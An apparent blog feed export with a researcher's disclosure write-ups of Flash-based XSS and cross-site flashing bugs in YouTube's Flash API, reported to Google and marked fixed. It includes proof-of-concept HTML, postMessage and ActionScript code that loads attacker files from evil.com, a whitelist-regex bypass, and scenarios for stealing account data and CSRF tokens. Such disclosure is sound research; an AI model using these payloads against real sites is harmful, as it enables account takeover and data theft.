<p><a href="/wp-content/uploads/2017/09/Diagramme9.svg"><img loading="lazy" class="wp-image-190 aligncenter" src="/wp-content/uploads/2017/09/Diagramme9.svg" alt="" width="864" height="350" /></a></p>
<p>evil.com/evil.html source code:</p>
<pre><code >&lt;!DOCTYPE html&gt;<br />
&lt;html&gt;<br />
&lt;body&gt;<br />
&lt;!-- Youtube iframe api with forced Flash fallback --&gt;<br />
&lt;iframe id="player" src="https://www.youtube.com/embed/?nohtml5=1"&gt;&lt;/iframe&gt;<br />
&lt;script&gt;<br />
// Wait 5 seconds to let the Youtube iframe fully load<br />
setTimeout(<br />
function(){<br />
// Send the loadPlaylist command to the Youtube iframe using postMessage api, with the image payload<br />
document.getElementById("player").contentWindow.postMessage('{"command":"loadPlaylist","data":[{"video_id":"xyz","iurl":"https://accounts.youtube.com/accounts/SetSID?continue=https%3A%2F%2Fwww.google.com%2Famp%2Fs%2Fevil.com%2Fevil.swf"}]}', "*");<br />
}<br />
, 5000);<br />
&lt;/script&gt;<br />
&lt;/body&gt;<br />
&lt;/html&gt;</code></pre>
<p>evil.swf source code:</p>
<pre><code >public class Main extends Sprite {<br />
public function Main(){<br />
// Execute arbitrary javascript on youtube.com/embed using ExternalInterface (Flash to javascript api)<br />
ExternalInterface.call("alert", "document.domain + ' XSSed!'");<br />
}<br />
}</code></pre>
<p>Attack Scenario:<br />
Prerequisite: The victim has Flash Player enabled<br />
1. The victim visits evil.com/evil.html<br />
2. evil.html loads youtube.com/embed iframe<br />
3. evil.html sends the loadPlaylist payload<br />
4. youtube.com/embed loads evil.swf<br />
5. evil.swf execute XSS on youtube.com/embed</p>
<p>Mitigation:<br />
Google patched the Main App so that it doesn&#8217;t take picture url into account in loadPlaylist arguments.</p>
<p>Timeline:<br />
10/05/2016 Reported to Google<br />
10/11/2016 &#8220;Nice catch&#8221; and reward<img loading="lazy" class="alignnone wp-image-141" src="/wp-content/uploads/2017/08/2-stars.png" alt="" width="56" height="13" /><br />
11/09/2016 Bug fixed and verified</p>
<p>&nbsp;</p>
<h3>2. Flash based XSS using trustedLoader Regex</h3>
<p>In addition to public commands like playVideo() or loadPlaylist(), Youtube api has private commands that are available only if the webpage that loads the Youtube iframe is from a verified, trusted origin (like youtube.com or drive.google.com/xxx). To do this, the Main App uses a whitelist stored in a regex. The regex is like this :<br />
<pre><code >public static const trustedLoader:RegExp = new RegExp("^https?://((www\.|encrypted\.)?google(\.com|\.co)?\.[a-z]{2,3}/(search|webhp)\?|24e12c4a-a-95274a9c-s-sites.googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf|www\.gstatic\.com/doubleclick/studio/innovation/h5/layouts/tetris|tpc\.googlesyndication\.com/safeframe/|lightbox-(demos|builder)\.appspot\.com/|([A-Za-z0-9-]{1,63}\.)*(imasdk\.googleapis\.com|corp\.google\.com|borg\.google\.com|docs\.google\.com|drive\.google\.com|googleads\.g\.doubleclick\.net|googleplex\.com|play\.google\.com|prod\.google\.com|sandbox\.google\.com|photos\.google\.com|picasaweb\.google\.com|lh2\.google\.com|plus\.google\.com|books\.googleusercontent\.com|mail\.google\.com|talkgadget\.google\.com|survey\.g\.doubleclick\.net|youtube\.com|youtube\.googleapis\.com|youtube-nocookie\.com|youtubeeducation\.com|vevo\.com)(:[0-9]+)?([\/\?\#]|$))");</code></pre></p>
<blockquote><p>Before reading more, you should check the regex yourself and try to find the mistake in it!</p>
<p>&nbsp;</p></blockquote>
<p>&#8220;.&#8221; (dot) is a wildcard in Regex, which means it will match any character. If you only want to match a literal dot, you have to escape it like this &#8220;\.&#8221;<br />
In trustedLoader RegExp, we have this code : <pre><code >24e12c4a-a-95274a9c-s-sites.googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf</code></pre><br />
where the dots are not escaped. This means that we can replace the dots by any character and it will still match the Regex.<br />
in particular, http://24e12c4a-a-95274a9c-s-sites<strong>A</strong>googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf will match the regex, and this domain is not owned by Google. It was available so I bought it for 1$! (You could use any alphanumeric character instead of A)<br />
I hosted a html page at http://24e12c4a-a-95274a9c-s-sites<strong>A</strong>googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf that will load a Youtube iframe and I have access to the private commands of the Youtube api.</p>
<p>Among the private commands there is a function updateVideoData(), that allows you to inject an arbitrary Flash file as a poster image exactly like with loadPlaylist() before. I won&#8217;t go into details as the rest of the report is similar to previous one.</p>
<p>Mitigation:<br />
Google patched trustedLoader Regex to properly escape dots like this 24e12c4a-a-95274a9c-s-sites\.googlegroups\.com/a/google\.com/flash-api-test-harness/apiharness\.swf</p>
<p>Timeline:<br />
11/22/2016 Report to Google<br />
11/29/2016 Reward<img loading="lazy" class="alignnone wp-image-141" src="/wp-content/uploads/2017/08/2-stars.png" alt="" width="56" height="13" /><br />
01/18/2017 Issue fixed and verified</p>
<p>&nbsp;</p>
<h3>3. Flash based XSS using trustedLoader regex&#8230; again!</h3>
<p>Let&#8217;s have a look at the trustedLoader regex again. There are still problems with it! For example <pre><code >google(\.com|\.co)?\.[a-z]{2,3}</code></pre> is not a secure way to check that a domain is a Google owned domain because <pre><code >google.com.fun</code></pre> for example will match the regex but is not a Google owned domain.<br />
Let&#8217;s take another example: <pre><code >www\.gstatic\.com/doubleclick/studio/innovation/h5/layouts/tetris</code></pre> is consider a trusted url. But there are XSSes in other www.gstatic.com webpages, and from there we can execute arbitrary javascript on www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris and then load a Youtube iframe, send a updateVideoData() command and execute XSS on youtube.com/embed.</p>
<p>Let&#8217;s make a drawing of the attack workflow:</p>
<p><a href="/wp-content/uploads/2017/09/Diagramme10.svg"><img loading="lazy" class="wp-image-191 aligncenter" src="/wp-content/uploads/2017/09/Diagramme10.svg" alt="" width="923" height="406" /></a></p>
<p>Technical details:<br />
Prerequisite: The victim has Flash Player and opens www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf?chartId=[arbitrary javascript]<br />
1. The arbitrary javascript makes www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf load an iframe at https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris<br />
2-3-4. The arbitrary javascript makes https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris load an iframe at youtube.com/embed<br />
5. The arbitrary javascript sends a updateVideoData() command to Youtube iframe<br />
6. Youtube iframe accepts the command because https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris is a trusted loader, and transmits it to Main App<br />
7. Main App loads arbitrary Flash file (the open redirection was different this time because previous one was fixed)<br />
8. Evil Flash file executes XSS on youtube.com/embed</p>
<p>&nbsp;</p>
<p>Mitigation:<br />
Youtube removed the option nohtml5=1 to force the Flash fallback. There are still similar vulnerabilities but they are now limited to browsers that can&#8217;t play video using html5. This is typically very old browsers that are out of scope for Bug Bounty programs.</p>
<p>Timeline:<br />
02/02/2017 Report to Google<br />
02/02/2017 &#8220;Nice catch&#8221; from Eduardo, who also advised me to apply to <a href="https://www.google.com/about/appsecurity/research-grants/" target="_blank" rel="noopener noreferrer">Google Research Grants </a>program<br />
02/14/2017 Reward <img loading="lazy" class="alignnone size-full wp-image-70" src="/wp-content/uploads/2017/08/3-stars.png" alt="" width="60" height="14" /><br />
04/11/2017 Issue fixed and verified</p>
<p>Conclusion:<br />
You can see that Flash and javascript are very similar and can be used together or you can replace one by the other. The same is true for Flash security and javascript security, this is why I think it is useful to learn about Flash implementation vulnerabilities in order to build more secure javascript applications (especially when there is a Flash fallback). You can also see that Flash based XSS are very similar to DOM XSSes is the sense that they only reveal during code execution and cannot be caught by Web Application Firewalls, browser based mitigation like XSS auditor or even vulnerability scanners.</p>
<p>Thank you very much for reading, and I also want to thank Google VRP team because you are really doing an amazing work!</p>
<p>In the future I will disclose more mixed javascript/Flash bugs from Youtube, Facebook, WordPress and others, and slowly we will get rid of Flash and I will disclose pure javascript vulnerabilities on those domains.</p>

<div class="twitter-share"><a href="https://twitter.com/intent/tweet?text=Flash%20based%20%23XSS-es%20on%20Youtube%20iframe%20api%20%28Flash%20vulnerabilities%20in%20Youtube%20Part%204%29&#038;url=https%3A%2F%2Fopnsec.com%2F2017%2F09%2Fadvanced-flash-vulnerabilities-in-youtube-part-4%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
]]></content:encoded>
					
					<wfw:commentRss>/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/feed/</wfw:commentRss>
			<slash:comments>4</slash:comments>
		
		
		<post-id xmlns="com-wordpress:feed-additions:1">188</post-id>	</item>
		<item>
		<title>Advanced Flash Vulnerabilities in Youtube &#8211; Part 3</title>
		<link>/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=advanced-flash-vulnerabilities-in-youtube-part-3</link>
		
		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
		<pubDate>Wed, 30 Aug 2017 12:04:52 +0000</pubDate>
				<category><![CDATA[Flash]]></category>
		<category><![CDATA[Vulnerability]]></category>
		<category><![CDATA[Youtube]]></category>
		<guid isPermaLink="false">/?p=64</guid>

					<description><![CDATA[III. XSF via loaderinfo.url redefinition Let&#8217;s have a look at how the Main App loads the Modules : The url of the module is dynamically generated by the main app by using it&#8217;s own url (2) and replacing the filename (watch_as3.swf) by the module filename (subtitles.swf) (3). This allows to handle multiple versions on the&#8230; <a class="read-more" href="/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/">Read More</a>]]></description>
										<content:encoded><![CDATA[<h3>III. XSF via loaderinfo.url redefinition</h3>
<p><img loading="lazy" class="alignnone size-medium wp-image-150" style="display: none;" src="/wp-content/uploads/2017/08/s.ytimg_.com-POC-300x121.png" alt="" width="1" height="1" srcset="/wp-content/uploads/2017/08/s.ytimg_.com-POC-300x121.png 300w, /wp-content/uploads/2017/08/s.ytimg_.com-POC-150x150.png 150w, /wp-content/uploads/2017/08/s.ytimg_.com-POC-768x310.png 768w, /wp-content/uploads/2017/08/s.ytimg_.com-POC-1024x414.png 1024w, /wp-content/uploads/2017/08/s.ytimg_.com-POC-640x360.png 640w, /wp-content/uploads/2017/08/s.ytimg_.com-POC.png 1186w" sizes="(max-width: 1px) 100vw, 1px" />Let&#8217;s have a look at how the Main App loads the Modules :</p>
<p><a href="/wp-content/uploads/2017/08/Diagramme7.svg"><img loading="lazy" class="wp-image-66 aligncenter" src="/wp-content/uploads/2017/08/Diagramme7.svg" alt="" width="907" height="217" /></a></p>
<p>The url of the module is dynamically generated by the main app by using it&#8217;s own url (2) and replacing the filename (watch_as3.swf) by the module filename (subtitles.swf) (3). This allows to handle multiple versions on the Main App, each one with it&#8217;s own Modules location.</p>
<p>To find it&#8217;s own url, the main app uses the <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/LoaderInfo.html#url" target="_blank" rel="noopener noreferrer">loaderinfo.url</a> property of appLoader.</p>
<blockquote><p>Since appLoader is similar to an &lt;iframe&gt; in html, appLoader.loaderInfo.url is similar to the &#8220;src&#8221; attribute of the iframe.</p></blockquote>
<p>In flash a Loader can load multiple swf files while in html an iframe can only load one window at a time</p>
<p>This means that if appLoader first loads the Main App and then immediately loads another Flash file the loaderinfo.url property of the Main app will not reflect the url of the Main App but instead the url of the other loaded flash file.<br />
POC workflow</p>
<p><a href="/wp-content/uploads/2017/08/Diagramme5.svg"><img loading="lazy" class="wp-image-68 aligncenter" src="/wp-content/uploads/2017/08/Diagramme5.svg" alt="" width="818" height="314" /></a></p>
<p>We removed Youtube Wrapper and replaced it with Evil Wrapper. Evil Wrapper will first load the Main App (1), and then immediately load another file (Noop.swf) with the same Loader appLoader (2). When the Main app will try to load a Module, it will get the appLoader url value (3) (evil.com/Noop.swf), replace the filename with the module name (evil.com/subtitles.swf) and load an arbitrary Flash file into it own Flash security sandbox (4).</p>
<p>From there Evil Module will be in the Main App Security Sandbox and will appear to be located at s.ytimg.com/[[IMPORT]]/evil.com/subtitles.swf. However, s.ytimg.com is a sandboxed domain which doesn&#8217;t have any cookie, CSRF token or webpage to exploit.</p>
<p>In <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/">part 2</a> I introduced URLLoader, which is similar to XHR. You can make cross-domain requests with URLLoader if the remote server has a crossdomain.xml file allowing &#8220;s.ytimg.com&#8221;</p>
<blockquote><p>crossdomain.xml mechanism is similar to CORS headers for XHR cross-domain requests in javascript</p></blockquote>
<p>The good news is that <a href="https://www.youtube.com/crossdomain.xml" target="_blank" rel="noopener noreferrer">https://www.youtube.com/crossdomain.xml</a> does allow https://s.ytimg.com/. Even more, <a href="https://drive.google.com/crossdomain.xml" target="_blank" rel="noopener noreferrer">https://drive.google.com/crossdomain.xml</a>, <a href="https://docs.google.com/crossdomain.xml" target="_blank" rel="noopener noreferrer">https://docs.google.com/crossdomain.xml</a> and <a href="https://clients6.google.com/crossdomain.xml" target="_blank" rel="noopener noreferrer">other google domains </a>also allow https://s.ytimg.com/.</p>
<p>This means that Evil Module can send requests to any URL at youtube.com, drive.google.com and docs.google.com (including POST requests and custom headers) and read the response source code (5).<br />
Attack scenario:<br />
1. The victim is logged in Youtube or Google Drive and has Flash player<br />
2. The victim visits the attacker evil.com/evil.html page which contains a Flash object evil.com/evil.swf<br />
3. The attacker has control over the victim&#8217;s Youtube, Google Drive and Google Docs accounts</p>
<p>Impact:<br />
The attacker can steal private information, CSRF tokens and perform any CSRF action on these domains. A very nasty exploit could steal and delete all the victim Google Drive files and then post the POC url on Youtube comments from the victim account to spread the exploit. I won&#8217;t provide such POC (I would like to safely return to DefCon next year&#8230;) but it would only take about 20 LOC to build it!</p>
<p>Timeline:<br />
09/11/2015 &#8211; reported to Google VRP<br />
09/16/2015 &#8211; &#8220;Nice catch&#8221; from Google<br />
09/25/2015 &#8211; Temporary mitigation and reward<img loading="lazy" class="alignnone size-full wp-image-70" src="/wp-content/uploads/2017/08/3-stars.png" alt="" width="60" height="14" /><br />
10/14/2015 &#8211; Issue fixed and verified</p>
<p>Conclusion:<br />
When using a sandboxed domain for hosting untrusted applications, like s.ytimg.com, you should always make sure that the sandboxed domain has no privilege on sensitive domains, like crossdomain.xml files, CORS, framing or CSP.</p>
<p>[<strong>UPDATED</strong>] <strong><a href="/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/">Part 4 </a></strong>is now online with 3 Flash based XSS on Youtube!</p>
<p>You can also see a live Flash based XSS on twitter <a href="/twitter/photo.html" target="_blank" rel="noopener noreferrer">here</a></p>

<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F08%2Fadvanced-flash-vulnerabilities-in-youtube-part-3%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
]]></content:encoded>
					
		
		
		<post-id xmlns="com-wordpress:feed-additions:1">64</post-id>	</item>
		<item>
		<title>Advanced Flash Vulnerabilities in Youtube &#8211; Part 2</title>
		<link>/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=advanced-flash-vulnerabilities-in-youtube-part-2</link>
		
		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
		<pubDate>Wed, 30 Aug 2017 11:21:40 +0000</pubDate>
				<category><![CDATA[Flash]]></category>
		<category><![CDATA[Vulnerability]]></category>
		<category><![CDATA[Youtube]]></category>
		<guid isPermaLink="false">/?p=53</guid>

					<description><![CDATA[II. XSF via appLoader In Part 1, I introduced an information leakage vulnerability in Youtube. In this part I will disclose a more severe vulnerability that allows arbitrary Flash code execution in youtube.com. This type of vulnerability is very similar to XSS except we execute Flash code instead of Javascript. It is called Cross-Site Flashing&#8230; <a class="read-more" href="/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/">Read More</a>]]></description>
										<content:encoded><![CDATA[<h3>II. XSF via appLoader</h3>
<p><img loading="lazy" class="alignnone size-medium wp-image-149" style="display: none;" src="/wp-content/uploads/2017/08/Youtube-POC-300x116.png" alt="" width="1" height="1" srcset="/wp-content/uploads/2017/08/Youtube-POC-300x116.png 300w, /wp-content/uploads/2017/08/Youtube-POC-150x150.png 150w, /wp-content/uploads/2017/08/Youtube-POC-768x296.png 768w, /wp-content/uploads/2017/08/Youtube-POC-1024x395.png 1024w, /wp-content/uploads/2017/08/Youtube-POC-640x360.png 640w, /wp-content/uploads/2017/08/Youtube-POC.png 1190w" sizes="(max-width: 1px) 100vw, 1px" />In <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube/"><strong>Part 1</strong></a>, I introduced an information leakage vulnerability in Youtube. In this part I will disclose a more severe vulnerability that allows arbitrary Flash code execution in youtube.com.<br />
This type of vulnerability is very similar to XSS except we execute Flash code instead of Javascript. It is called Cross-Site Flashing (XSF) or Same-Origin Policy Bypass using Flash.</p>
<p>It will get a little bit more complex, you can read more about Flash security model <a href="http://www.senocular.com/flash/tutorials/contentdomains/" target="_blank" rel="noopener noreferrer">here</a>.</p>
<p>Let&#8217;s have a look at the Youtube Flash Api, this time showing the security sandboxes.</p>
<p><img loading="lazy" class="wp-image-54 aligncenter" src="/wp-content/uploads/2017/08/Diagramme6.svg" alt="" width="905" height="241" /></p>
<p>A <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/Loader.html" target="_blank" rel="noopener noreferrer">Loader </a>object can load an external Flash file in 2 ways :</p>
<p>(1) In the normal way, the 2 Flash files are in separate Security Sandboxes (like with &lt;iframe&gt; in html)</p>
<p>(2) If the loader uses the argument &#8220;<a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/SecurityDomain.html" target="_blank" rel="noopener noreferrer">SecurityDomain.currentDomain</a>&#8220;, the <strong>loaded Flash file will execute in the loader security sandbox </strong>(similar to &lt;script src=&#8221;&#8221;&gt; in html, which is very different than loading an &lt;iframe&gt;!). This is how the Main App loads the Modules.<br />
Note: don&#8217;t be fooled by the fact that the Main App and Modules files are both located in the same domain s.ytimg.com, this is not the reason why they are in the same security sandbox here, but because the Main App uses the argument &#8220;<a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/SecurityDomain.html" target="_blank" rel="noopener noreferrer">SecurityDomain.currentDomain</a>&#8221; to load Modules.</p>
<p>We already saw in Part 1 a technique to access the Youtube appLoader property using youtubeWrapper.getChildAt(0). This time we will use appLoader to load another external file into Youtube security sandbox using appLoader.load(&#8220;evil.com/evil2.swf&#8221;, SecurityDomain.currentDomain).</p>
<p>&nbsp;</p>
<p>Here is the POC workflow</p>
<p><a href="/wp-content/uploads/2017/08/Diagramme3.svg"><img loading="lazy" class="wp-image-59 aligncenter" src="/wp-content/uploads/2017/08/Diagramme3.svg" alt="" width="905" height="335" /></a></p>
<p>And the POC code:</p>
<pre><code >var loader = new Loader();<br />
// Load the Youtube Wrapper (1)<br />
loader.load(new URLRequest("https://www.youtube.com/v/[VIDEO_ID]"));<br />
var youtubeWrapper = loader.content;<br />
// Access the Youtube Wrapper appLoader object (3)<br />
var appLoader = youtubeWrapper.getChildAt(0);<br />
// Load evil2.swf in youtubeWrapper security sandbox. (4)<br />
appLoader.load(new URLRequest("http://evil.com/evil2.swf"), new LoaderContext(false, ApplicationDomain.currentDomain, SecurityDomain.currentDomain));<br />
// evil2.swf can execute arbitrary code in youtube.com security sandbox (5)</code></pre>
<p>&nbsp;</p>
<p>Technical details:<br />
SecurityDomain.currentDomain is a relative value, since it&#8217;s apply to the <strong>current</strong> Security Sandbox. Flash documentation states that it is the security sandbox of the file where the instruction is written. Nice and easy, however, it is proven to be more complex here.</p>
<p>appLoader is instantiated in Youtube Wrapper, but the call to appLoader.load(evil.com/evil2.swf, SecurityDomain.currentDomain ) is written in evil.swf. So evil2.swf should normally load in evil.swf security sandbox. If you debug the Flash execution, this is what is happening first (when looking for crossdomain.xml file). But at the last moment, because appLoader was instantiated in Youtube Wrapper, evil2.swf will actually execute in Youtube security sandbox.</p>
<p>Once evil.com/evil2.swf is loaded in Youtube security sandbox, the Flash Player will treat it like if it was located at https://www.youtube.com/v/xxx/[[IMPORT]]/http://evil.com/evil2.swf.<br />
This means that evil2.swf can send request to any https://www.youtube.com/ URL and read response source code using <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/URLLoader.html" target="_blank" rel="noopener noreferrer">URLLoader</a>.</p>
<blockquote><p>URLLoader is similar to <a href="https://developer.mozilla.org/en/docs/Web/API/XMLHttpRequest" target="_blank" rel="noopener noreferrer">XHR </a>in javascript.</p></blockquote>
<p>Impact:<br />
Using this vulnerability, an attacker could access any private data on the victim&#8217;s Youtube account. It could access private videos, post comments on behalf of the victim or delete all the victim&#8217;s videos. The impact is similar to a reflective XSS on youtube.com.</p>
<p>Attack scenario:<br />
Prerequisite : The victim is logged in Youtube and have Flash active<br />
1 The victim visits http://evil.com/evil.html<br />
2 The attacker has control over the victim&#8217;s Youtube account</p>
<p>Timeline:<br />
05/20/2016 â€“ reported to Google VRP<br />
05/20/2016 â€“ â€œNice catchâ€ from Google<br />
05/24/2016 â€“ reward<img loading="lazy" class="alignnone size-full wp-image-70" src="/wp-content/uploads/2017/08/2-stars.png" alt="" width="60" height="14" /><br />
06/07/2016 â€“ Issue fixed and verified<br />
&nbsp;<br />
Conclusion:<br />
Security Sandbox is a great tool but it is complex and implemented deep inside the core language, making it difficult for developers to predict the exact behavior for edge cases (in particular if the language is not open source). Always be careful when using it.<br />
&nbsp;<br />
In <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/"><strong>Part 3</strong></a>, I will disclose another XSF and show how Flash vulnerability can be even more dangerous than XSS in some cases.<br />
&nbsp;</p>

<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F08%2Fadvanced-flash-vulnerabilities-in-youtube-part-2%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
]]></content:encoded>
					
		
		
		<post-id xmlns="com-wordpress:feed-additions:1">53</post-id>	</item>
		<item>
		<title>Advanced Flash Vulnerabilities in Youtube &#8211; Part 1</title>
		<link>/2017/08/advanced-flash-vulnerabilities-in-youtube/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=advanced-flash-vulnerabilities-in-youtube</link>
					<comments>/2017/08/advanced-flash-vulnerabilities-in-youtube/#comments</comments>
		
		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
		<pubDate>Fri, 25 Aug 2017 10:26:45 +0000</pubDate>
				<category><![CDATA[Flash]]></category>
		<category><![CDATA[Vulnerability]]></category>
		<category><![CDATA[Youtube]]></category>
		<guid isPermaLink="false">/?p=8</guid>

					<description><![CDATA[Why Flash Security still matters? Flash is still an active threat. In 2017, I reported Flash vulnerabilities to Facebook, Youtube, WordPress, Yahoo, Paypal and Stripe. Over the last 3 years, I reported more than 50 Flash vulnerabilities to Bug Bounty programs. And there are many more I didn&#8217;t have the time to report or that&#8230; <a class="read-more" href="/2017/08/advanced-flash-vulnerabilities-in-youtube/">Read More</a>]]></description>
										<content:encoded><![CDATA[<h3>Why Flash Security still matters?</h3>
<p><img loading="lazy" class="alignnone wp-image-147 size-medium" style="display: none;" src="/wp-content/uploads/2017/08/Youtube-Flash-Api-1.png" alt="" width="1" height="1" />Flash is still an active threat. In 2017, I reported Flash vulnerabilities to Facebook, Youtube, WordPress, Yahoo, Paypal and Stripe. Over the last 3 years, I reported more than 50 Flash vulnerabilities to Bug Bounty programs. And there are many more I didn&#8217;t have the time to report or that weren&#8217;t fixed after I reported it.</p>
<p><img loading="lazy" class="size-medium wp-image-73 aligncenter" src="/wp-content/uploads/2017/08/1uureg-300x184.jpg" alt="" width="300" height="184" srcset="/wp-content/uploads/2017/08/1uureg-300x184.jpg 300w, /wp-content/uploads/2017/08/1uureg.jpg 450w" sizes="(max-width: 300px) 100vw, 300px" /><br />
In addition, Flash has been replaced by new javascript/html5 features. These features introduce complexity and new kind of vulnerabilities like bad CORS implementation, DOM XSSes triggered by postMessage or XHR requests, active mixed content&#8230; Learning from Flash mistakes can help design and implement more secure javascript applications. The new Youtube html5 Api is mostly a porting of the Youtube Flash Api to javascript, making it interesting to study. In fact, I was able to find XSSes in the Youtube html5 Api using my knowledge of the Flash Api.<br />
I&#8217;ll explain some advanced Flash vulnerabilities I found in Youtube Flash Api and in the process I will draw a parallel with html/javascript security. This is quite technical so feel free to comment or to tweet me (<a href="https://twitter.com/opnsec" target="_blank" rel="noopener noreferrer">@opnsec</a>) if something is not clear or if you want to add something. You can also read more about Flash security model <a href="http://www.senocular.com/flash/tutorials/contentdomains/" target="_blank" rel="noopener noreferrer">here</a>.</p>
<h2>Reverse engineering Youtube Flash Api</h2>
<p>Youtube Flash Api allows developers to embed a Youtube video in an external website.<br />
Here is the workflow of the Api:</p>
<p><a href="/wp-content/uploads/2017/08/Diagramme1.svg" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="aligncenter wp-image-11" src="/wp-content/uploads/2017/08/Diagramme1.svg" alt="" width="982" height="468" /></a></p>
<p>The entry point, Youtube Wrapper, is a Flash file located at youtube.com/v/[VIDEO_ID], it is just a wrapper between the HTML page and the Main App.<br />
The Main Application is a large flash file of about 100k LoC and is located in a sandboxed domain s.ytimg.com.<br />
The Modules handle optional functions like subtitles or advertisements. They are not stand-alone Flash files and can only be loaded by the Main App.</p>
<p>In addition there is a Flash to Javascript Api that allows the html page to send commands to the Youtube Api like play(), pause(), etc&#8230; Flash files will also perform &#8220;ajax style&#8221; cross-domain requests to load configuration files and video data.</p>
<h2>I. User info leakage</h2>
<p>Let&#8217;s start with a simple vulnerability. Here is a simplified version of Youtube Wrapper code in Flash ActionScript3 (AS3) :</p>
<pre><code >public class YoutubeWrapper extends Sprite{</p>
<p>private var user_name = "The Victim";<br />
private var user_picture = "https://googleusercontent.com/.../victim_photo.jpg";<br />
private var appLoader = new Loader();</p>
<p>public function YoutubeWrapper(){<br />
// allow external javascript/Flash files to access its public properties<br />
Security.allowDomain("*");<br />
// load the Main App<br />
this.appLoader .load(new URLRequest("https://s.ytimg.com/.../watch_as3.swf");<br />
// add as child of display container<br />
this.addChild(this.appLoader );<br />
// loaderInfo.sharedEvents Api<br />
this.loader.contentLoaderInfo.sharedEvents<br />
.addEventListener("REQUEST_USERINFO", this.onRequestUserinfo);<br />
}<br />
private function onRequestUserinfo(event:Event){<br />
// write the user info into the event.data property<br />
// which is accessible to the sharedEvents caller<br />
event.data.user_name = this.user_name;<br />
event.data.user_image = this.user_image;<br />
}<br />
}</code></pre>
<p>Youtube Wrapper is generated on the fly and its property &#8220;user_name&#8221; contains the Google user name (if he is connected to Google). The property &#8220;user_picture&#8221; contains the link to the user profile picture. In this bug, the attacker will steal these values.</p>
<p>Youtube Wrapper can be loaded from the developer own Flash file (let&#8217;s call it Evil Wrapper). In that case, they both executes in a different Flash security sandbox.</p>
<blockquote><p>Loading an external Flash file in Flash is a little bit similar to loading an &lt;iframe&gt; in html. If the iframe is from a different origin than its parent, they cannot access each other properties due to the Same-Origin Policy (SOP)</p></blockquote>
<p>Youtube Wrapper contains the code <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/Security.html#allowDomain()" target="_blank" rel="noopener noreferrer">Security.allowDomain(&#8220;*&#8221;)</a> to allow javascript on the hosting webpage to send commands to the Flash app like play(), pause(),etc&#8230; This also means that Evil Wrapper can access any public property of Youtube Wrapper as if it was in the same Security sandbox. However it cannot access private properties.</p>
<p>The user_name property is private so Evil Wrapper cannot access it.</p>
<p>Flash also provides an Api for communication between a Loader and a loaded file using <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/LoaderInfo.html#sharedEvents" target="_blank" rel="noopener noreferrer">loaderInfo.sharedEvents</a>. Youtube Wrapper uses this api to communicate with the Main App. When the Main App dispatches an event to the sharedEvents Api, the Youtube Wrapper receives the event and send back the user info using the event.data property.<br />
loaderInfo.sharedEvents is not only accessible to the loader and the loaded files, but also to any Flash file that has a reference to this loaderInfo object.</p>
<blockquote><p>This is similar to the javascript <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener noreferrer">postMessage Api </a>which allows communication between cross-domain iframes. The postMessage Api is accessible not only to the iframe and its parent but also to any other window that has a reference to the iframe or the parent. Any arbitrary domain can access these references using window.open and window.frames, which are not restricted by the SOP.</p></blockquote>
<p>If Evil loader can access this particular loaderInfo object it will be able to send an event to the Youtube Wrapper and steal the user info.<br />
loaderInfo is a property of appLoader which is a private property of the Youtube Wrapper, so Evil Wrapper cannot access it.</p>
<p>However, when using a Loader, if you want to display the loaded file, you have to add it as a child of the Display Container. This is usually done using<br />
this.<a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/DisplayObjectContainer.html#addChild()" target="_blank" rel="noopener noreferrer">addChild</a>(this.loader); and this is exactly what the Youtube Wrapper does.<br />
The thing is that the Youtube Wrapper also have a built-in public method <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/DisplayObjectContainer.html#getChildAt()" target="_blank" rel="noopener noreferrer">getChildAt</a>() that will return the children of the Youtube Wrapper. This means that Evil Wrapper can call YoutubeWrapper.getChildAt(0) which will return the loader object, bypassing the privacy of the loader property.</p>
<blockquote><p>Setting a property as &#8220;private&#8221; is called <a href="https://en.wikipedia.org/wiki/Encapsulation_(computer_programming)" target="_blank" rel="noopener noreferrer">encapsulation</a>. However, only the reference is private, not the object the reference points to.</p></blockquote>
